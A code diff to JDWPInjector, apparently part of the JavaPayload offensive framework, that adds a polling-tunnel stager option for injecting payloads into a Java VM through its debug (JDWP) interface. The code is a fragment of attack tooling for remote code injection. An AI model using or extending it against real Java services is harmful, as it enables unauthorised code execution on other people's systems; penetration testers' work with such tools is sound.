@@ -41,6 +41,7 @@ import java.util.ArrayList;
 import java.util.List;
 import java.util.Map;
 
+import javapayload.handler.stager.PollingTunnel;
 import javapayload.handler.stager.StagerHandler;
 import javapayload.loader.DynLoader;
 
@@ -173,6 +174,7 @@ public class JDWPInjector {
 			}
 		}
 		boolean isJDWPTunnelStager = loader.canHandleExtraArg(ClassType.class);
+		boolean isPollingTunnelStager = loader.canHandleExtraArg(PollingTunnel.CommunicationInterface.class);
 		loader.handleBefore(loader.stageHandler.consoleErr, null); // may modify stagerArgs
 		final StringBuffer embeddedArgs = new StringBuffer();
 		for (int i = 0; i < stagerArgs.length; i++) {
@@ -181,6 +183,8 @@ public class JDWPInjector {
 			}
 			embeddedArgs.append("$").append(stagerArgs[i]);
 		}
+		if (isPollingTunnelStager)
+			embeddedArgs.append("\n$-WAITLOOP-");
 		Class[] classes = new Class[] { 
 				javapayload.stager.Stager.class,
 				DynLoader.loadStager(stager, stagerArgs, 0),
@@ -214,6 +218,8 @@ public class JDWPInjector {
 
 		if (isJDWPTunnelStager) {
 			loader.handleAfter(loader.stageHandler.consoleErr, firstInjectedClass);
+		} else if (isPollingTunnelStager) {
+			loader.handleAfter(loader.stageHandler.consoleErr, new JDWPPollingCommunicationInterface(vm, loader.stageHandler.consoleErr));
 		} else {
 			vm.dispose();
 			loader.handleAfter(loader.stageHandler.consoleErr, null);
